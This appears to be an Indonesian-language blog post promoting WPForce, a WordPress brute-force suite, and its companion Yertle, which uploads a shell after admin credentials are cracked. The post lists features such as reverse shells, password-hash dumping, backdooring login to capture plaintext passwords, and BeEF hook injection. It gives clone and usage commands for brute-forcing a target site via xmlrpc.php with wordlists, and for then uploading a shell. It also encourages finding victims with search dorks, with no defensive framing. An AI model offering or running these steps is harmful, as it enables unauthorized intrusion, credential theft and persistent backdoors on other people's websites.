---
title: 'WPForce - Wordpress Brute Force Attack Suite'
date: 2019-10-06T15:16:00+01:00
draft: false
---

  

[![](https://1.bp.blogspot.com/-qSggby8r0CA/XZnyxAT_GhI/AAAAAAAACkw/Eh_GQd06DzkMsdWqC1UC0NIf85VH99SnQCLcBGAsYHQ/s320/wpforce-run-www.codecrime.net_LI.jpg)](https://1.bp.blogspot.com/-qSggby8r0CA/XZnyxAT_GhI/AAAAAAAACkw/Eh_GQd06DzkMsdWqC1UC0NIf85VH99SnQCLcBGAsYHQ/s1600/wpforce-run-www.codecrime.net_LI.jpg)

  
**WPForce** dalah salah satu tools Serangan WordPress. Saat ini, ini berisi 2 script - WPForce, yang memaksa login melalui API, dan Yertle, yang mengunggah shell setelah kredensial admin ditemukan. Yertle juga berisi sejumlah modul pasca-eksploitasi.  
  
**Features**  

*   Can automatically upload an interactive shell
*   Can be used to spawn a full-featured reverse shell
*   Dumps WordPress password hashes
*   Can backdoor authentication function for plaintext password collection
*   Inject BeEF hook into all pages
*   Pivot to meterpreter if needed
*   Brute Force via API, not login form bypassing some forms of protection

  

**Installation WPForce Tool**

  

Untuk mendapatkan tool tersebut anda harus melakukan cloning repository berikut

  

```
git clone https://github.com/n00py/WPForce
```

[![](https://1.bp.blogspot.com/-2kIlqr7ckaM/XZnywGoHCgI/AAAAAAAACko/t_gQ6G2BMKsItPMIsXJe4Aemev60YxwFgCLcBGAsYHQ/s320/wpforce-git-www.codecrime.net.png)](https://1.bp.blogspot.com/-2kIlqr7ckaM/XZnywGoHCgI/AAAAAAAACko/t_gQ6G2BMKsItPMIsXJe4Aemev60YxwFgCLcBGAsYHQ/s1600/wpforce-git-www.codecrime.net.png)

  

**Running WPForce Tool**

  

Untuk menjalankannya anda bisa menginstall python terlebih dahulu, di terminal anda karena script ini di tulis menggunakan program python

Jalankan perintah berikut

  

```
python wpforce.py
```

[![](https://1.bp.blogspot.com/-sLwt4uDX5Ms/XZnyxe26EWI/AAAAAAAACk0/NKgyH4owZ6UKWEr_x0l0G1gHHduYYQYXgCLcBGAsYHQ/s320/wpforce-use-www.codecrime.net.png)](https://1.bp.blogspot.com/-sLwt4uDX5Ms/XZnyxe26EWI/AAAAAAAACk0/NKgyH4owZ6UKWEr_x0l0G1gHHduYYQYXgCLcBGAsYHQ/s1600/wpforce-use-www.codecrime.net.png)

  

  

\***Usage**

Sebelum menjalankan tool tersebut kalian wajib mempunyai wordlist untuk melakukan brute force terhadap target

```
python wpforce.py -i worlistuser.txt -w wordlistpass.txt -u http://target.com
```

  

[![](https://1.bp.blogspot.com/-qSggby8r0CA/XZnyxAT_GhI/AAAAAAAACkw/Eh_GQd06DzkMsdWqC1UC0NIf85VH99SnQCLcBGAsYHQ/s320/wpforce-run-www.codecrime.net_LI.jpg)](https://1.bp.blogspot.com/-qSggby8r0CA/XZnyxAT_GhI/AAAAAAAACkw/Eh_GQd06DzkMsdWqC1UC0NIf85VH99SnQCLcBGAsYHQ/s1600/wpforce-run-www.codecrime.net_LI.jpg)

  

  

Jika berhasil seperti gambar di atas, pastikan target kalian memiliki fitur xmlrpc.php, disini kalian bisa memainkan dork kalian lalu tunggu hinggal username dan password cocok

  

**Running And Upload Shell **

  

Jika kita sudah menemukan username atau password target tersebut, kalian bisa langsung upload shell dengan menjalankan perintah seperti berikut

  

```
python yertle.py -u username -p password -u http://target.com
```